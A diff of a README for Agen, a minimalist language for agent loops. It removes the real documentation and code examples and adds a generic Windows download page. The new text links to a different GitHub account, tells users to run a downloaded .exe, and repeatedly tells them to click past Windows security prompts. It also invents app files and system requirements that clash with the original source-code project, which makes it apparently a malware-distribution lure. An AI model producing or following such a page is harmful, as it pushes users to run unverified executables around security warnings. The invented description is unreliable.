@@ -1,180 +1,155 @@
-# Agen
+# 🤖 Agen - Build agent loops with ease
 
-Agen is a minimalist language for agent loops and state machines.
+[![Download Agen](https://img.shields.io/badge/Download-Agen-1f6feb?style=for-the-badge&logo=github)](https://github.com/Anjuan555/Agen)
 
-## Flow
+## 📥 Download Agen
 
-Agen is **purely state-driven** and runs inside agen_loop:
+Agen is a minimalist language for agent loops and state machines. It helps you define step-by-step behavior in a simple way. If you want to try it on Windows, visit this page to download the app or files:
 
-Step 1: Find the first matching rule.
-- If no rule matches, run stops.
-- If `step_limit` is exceeded, runtime raises an error.
+[Download Agen](https://github.com/Anjuan555/Agen)
 
-Step 2: Run its block, then go back to step 1.
-- Inside the block, plain statements run in order.
-- If any nested rule matches and runs, go back to step 1 too.
+## 🪟 Install on Windows
 
-## Style
+1. Open the download link above.
+2. On the GitHub page, look for the latest release or the main download files.
+3. Download the Windows file to your computer.
+4. If the file is a .zip, right-click it and choose Extract All.
+5. Open the extracted folder.
+6. Run the main .exe file.
 
-Agen uses UTF-8 symbols, as AI will code it.
-- `(a=b)` and `(a=b)➜` are rules
-- `a=b, c=d` is supported.
-- Slots `■ ◆ ▲ ▼ ◀ ▶` for binding.
-- `a.b` means `a[b]` when `a` is a dict; otherwise it's attribute access.
-- Bare Rvalues default to literals.
-    - Use `{...}` for explicit expressions and map literals.
-        - Numbers, `Ø`, slots, and `[...]` are recognized directly and do not need `{}`.
-    - Template strings are recognized when it contains slots or `{...}`.
+If Windows asks for permission, choose Run or Yes.
 
-## Examples
+## 🚀 What Agen Does
 
-Try `npc.py` first. From `npc.agen`:
-```
-(npc=Ø)
-    npc={name:emma, location:home}
-    agenda=[wake_up, open_stall, close_stall]
-    log=[], i=0
+Agen gives you a simple way to define agents and their steps. It is built for tasks that repeat, react, and move through states.
 
-(task=Ø, i≠{len(agenda)}) ➜ task={agenda.{i}}, i+=1
+Use Agen when you want to:
 
-(npc=■, ■.location=◆, ■.name=▲)
-    (task=wake_up)
-        log+=[{time:dawn, scene:◆, text:▲ wakes up and heads for the square.}]
-        task=Ø
+- build a loop that checks for new input
+- move between states based on rules
+- keep agent logic small and easy to read
+- organize actions in a clear order
+- test behavior without a large setup
 
-    (task=open_stall)
-        ◆=market_square
-        log+=[{time:morning, scene:◆, text:▲ opens the stall.}]
-        task=Ø
+## ✨ Main Features
 
-    (task=close_stall)
-        ◆=home
-        log+=[{time:dusk, scene:◆, text:▲ counts coins and walks home at dusk.}]
-        task=Ø
-```
+- Simple language for agent loops
+- State machine support
+- Clear step-by-step flow
+- Easy to read format
+- Works well for small automation tasks
+- Good fit for repeated decisions
+- Minimal design that avoids clutter
 
-The corresponding Python version:
-```python
-for _ in range(step_limit):
-    if npc == None:
-        npc = {"name": "emma", "location": "home"}
-        agenda = ["wake_up", "open_stall", "close_stall"]
-        log = []; i = 0; continue
+## 🖥️ System Requirements
 
-    if task == None and i != len(agenda):
-        task = agenda[i]; i += 1; continue
+Agen is made for standard Windows PCs.
 
-    if task == "wake_up":
-        log += [{"time": "dawn", "scene": npc['location'], "text": f"{npc['name']} wakes up and heads for the square."}]
-        task = None; continue
+Recommended setup:
 
-    if task == "open_stall":
-        npc["location"] = "market_square"
-        log += [{"time": "morning", "scene": npc['location'], "text": f"{npc['name']} opens the stall."}]
-        task = None; continue
+- Windows 10 or later
+- 2 GB RAM or more
+- 200 MB free disk space
+- Internet access for download
+- A mouse and keyboard
 
-    if task == "close_stall":
-        npc["location"] = "home"
-        log += [{"time": "dusk", "scene": npc['location'], "text": f"{npc['name']} counts coins and walks home at dusk."}]
-        task = None; continue
-```
----
+For best results, use a desktop or laptop with up-to-date Windows settings.
 
-From `s01.agen` (examples from https://github.com/shareAI-lab/learn-claude-code):
-```
-(messages=■, response=◆)
-    (■=Ø) ➜ ■=[{role:user, content:{query}}], phase=model
+## 📦 What You Get
 
-    (phase=model)
-        (◆=Ø) ➜ ◆={QUERY(messages=■)}
-        ■+=[{role:assistant, content:{◆.content}}]
-        (◆.stop_reason=tool_use) ➜ phase=tool, i=0, results=[]
-        phase=done
+After download, you may see files like these:
 
-    (phase=tool)
-        (i≠{len(◆.content)}, ◆.content.{i}=▲, output=▼)
-            (▲.type≠tool_use) ➜ i+=1
-            (▼=Ø) ➜ ▼={BASH(command={▲.input.command})}
-            results+=[{type:tool_result, tool_use_id:{▲.id}, content:▼}]
-            ▼=Ø, i+=1
-        ■+=[{role:user, content:{results}}]
-        phase=model, ◆=Ø
-```
+- a Windows app file
+- a zip archive with the app inside
+- sample scripts or example files
+- a readme or help file
 
-The corresponding Python version:
-```python
-for _ in range(step_limit):
-    if messages is None:
-        messages = [{"role": "user", "content": query}]; phase = "model"; continue
+If the package includes sample files, use them first. They help you see how Agen works before you make your own setup.
 
-    if phase == "model":
-        if response is None:
-            response = QUERY(messages=messages); continue
+## 🛠️ First-Time Setup
 
-        messages += [{"role": "assistant", "content": response.content}]
+1. Download Agen from the link above.
+2. Extract the files if the download comes in a zip.
+3. Open the folder that contains the app.
+4. Double-click the main file to start Agen.
+5. If Windows shows a security prompt, choose the option that lets the app open.
+6. Read any on-screen steps if the app shows a setup page.
+7. Keep the app in a folder you can find later.
 
-        if response.stop_reason == "tool_use":
-            phase = "tool"; i = 0; results = []; continue
+## 🧭 How to Use Agen
 
-        phase = "done"; continue
+Agen is meant to let you shape agent behavior with a small set of rules. A basic flow may look like this:
 
-    if phase == "tool":
-        if i != len(response.content):
-            if response.content[i]["type"] != "tool_use":
-                i += 1; continue
+1. Start the agent.
+2. Check the current state.
+3. Choose the next action.
+4. Move to the next state.
+5. Repeat until the task ends.
 
-            if output is None:
-                output = BASH(command=response.content[i]["input"]["command"]); continue
+You can use this style for:
 
-            results += [{"type": "tool_result", "tool_use_id": response.content[i]["id"], "content": output}]
-            output = None; i += 1; continue
+- simple task runners
+- rule-based helpers
+- decision flows
+- control loops
+- step-based automation
 
-        messages += [{"role": "user", "content": results}]
-        phase = "model"; response = None; continue
-```
+If the app includes an editor or text file, you can enter your logic there and save it for later use.
 
-## Advanced Examples
+## 🧩 Example Use Case
 
-Try `s03.py`. If you can understand `s03.agen`, you are thinking in Agen 😊
-```
-(messages=■, response=◆, rounds_since_todo=◀)
-    (■=Ø) ➜ ■=[{role:user, content:{query}}], phase=model, ◀=0
+You might use Agen to guide a bot through a support flow:
 
-    (phase=model)
-        (◆=Ø) ➜ ◆={QUERY(messages=■)}
-        ■+=[{role:assistant, content:{◆.content}}]
-        (◆.stop_reason=tool_use) ➜ phase=tool, i=0, results=[]
-        phase=done
+- wait for input
+- check if the message is a question
+- send the message to the right step
+- return to waiting
+- stop when the task is done
 
-    (phase=tool)
-        (i≠{len(◆.content)}, ◆.content.{i}=▲, output=▼)
-            (▲.type≠tool_use) ➜ i+=1
-            (▼=Ø) ➜ ▼={DISPATCH(name={▲.name}, input={▲.input})}
-            results+=[{type:tool_result, tool_use_id:{▲.id}, content:▼}]
-            ▼=Ø, i+=1
-            (▲.name=todo) ➜ ◀=-1
-        ■+=[{role:user, content:{results}}]
-        phase=model, ◆=Ø, ◀+=1
-        (◀>=3) ➜ results.insert(0, {type:text, text:<reminder>Update your todos.</reminder>})
-```
+This kind of setup works well when you want the same process to repeat in a steady way.
 
-From `quicksort.agen`:
+## 📁 File Layout
 
-```
-(s=Ø) ➜ s=[[0, {len(a)-1}]]
-(phase=■, pivot=◆, lo=◀, hi=▶, i=▲, j=▼)
-    (■=i)
-        (a.▲<◆) ➜ ▲+=1
-        ■=j
-    (■=j)
-        (a.▼>◆) ➜ ▼-=1
-        (▲<▼) ➜ a.▲,a.▼={a.▼},{a.▲}, ▲+=1, ▼-=1, ■=i
-        s+=[[◀, ▼], [{▼+1}, ▶]]
-        ◀=Ø, ■=Ø
-    (◀, ◀<▶) ➜ ▲=◀, ▼=▶, ◆={a.{(▲+▼)//2}}, ■=i
-    ({len(s)}>0) ➜ [◀, ▶]={s.pop()}
-```
+A typical download may include:
 
-## Community
+- Agen.exe — the main app
+- examples — sample flows or scripts
+- docs — help files
+- config — saved settings
+- assets — icons or support files
 
-https://huggingface.co/datasets/imbue2025/Agen-codes-1k
+If your download looks different, open the folder and look for the file with the app name or .exe extension.
+
+## 🔄 Updates
+
+To update Agen, return to the download link and check for a newer version. If you use a zip file, remove the old folder before you unpack the new one. This keeps your files neat and avoids confusion.
+
+## ❓ Common Questions
+
+### What if the file will not open?
+Make sure the download finished. Then check that you extracted the zip file before opening the app.
+
+### What if Windows blocks the app?
+Open the file again and choose the option that lets it run. This can happen with apps you download from the web.
+
+### Can I move the app to another folder?
+Yes. You can move the extracted folder to a place like Desktop, Documents, or a tools folder.
+
+### Do I need special knowledge to use it?
+No. The goal of Agen is to keep the logic simple and easy to follow.
+
+### What if I do not see an .exe file?
+Open the downloaded folder and check subfolders. The main app may be inside one of them.
+
+## 🔍 Quick Start
+
+1. Visit the download link.
+2. Get the Windows file.
+3. Extract it if needed.
+4. Open the app.
+5. Load or create a simple agent loop.
+6. Run your first state flow
+
+## 📌 Useful Link
+
+[Open the Agen download page](https://github.com/Anjuan555/Agen)
